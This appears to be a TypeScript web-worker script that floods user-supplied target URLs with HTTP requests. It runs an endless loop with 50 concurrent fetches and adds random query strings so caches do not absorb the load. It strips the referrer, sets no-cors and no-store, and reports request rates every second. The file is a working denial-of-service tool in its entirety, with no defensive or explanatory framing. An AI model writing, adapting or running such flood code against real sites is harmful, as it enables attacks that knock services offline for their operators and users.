import { randomInt } from "fp-ts/lib/Random";
import { generateRandomString } from "./utils";

const REPORT_INTERVAL = 1000;
const REQUEST_TIMEOUT_BASE = 500;
const CONCURRENCY = 50;
const PAYLOAD_SIZE = 2_000;

const sendRequest = async (target: string, timeout: number) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    await fetch(target, {
      mode: "no-cors",
      cache: "no-store",
      referrerPolicy: "no-referrer",
      signal: controller.signal,
    });

    clearTimeout(timeoutId);
  } catch (e) {
    clearTimeout(timeoutId);
  }
};

self.addEventListener(
  "message",
  async (e: MessageEvent<{ type: string; threads: number; url: string }>) => {
    if (e.data.type !== "init") return;
    const targets = e.data.url
      .split(",")
      .map(
        (target) => `https:${target.replace(/\s/, "").replace(/http(s?):/, "")}`
      );

    let nRequests = 0n;
    let payload = generateRandomString(PAYLOAD_SIZE);

    setInterval(() => {
      payload = generateRandomString(PAYLOAD_SIZE + randomInt(100, 200)());
      self.postMessage(nRequests);
      nRequests = 0n;
    }, REPORT_INTERVAL);

    const queue = [];

    while (true) {
      if (queue.length >= CONCURRENCY) {
        await queue[0];
        queue[0] = null;
        queue.shift();
        continue;
      }

      const timeoutRand = randomInt(50, 100)();
      targets.forEach((target) => {
        queue.push(
          sendRequest(
            `${target}?${payload.toString()}${Math.random()}`,
            REQUEST_TIMEOUT_BASE + timeoutRand
          )
        );
        nRequests++;
      });
    }
  },
  false
);
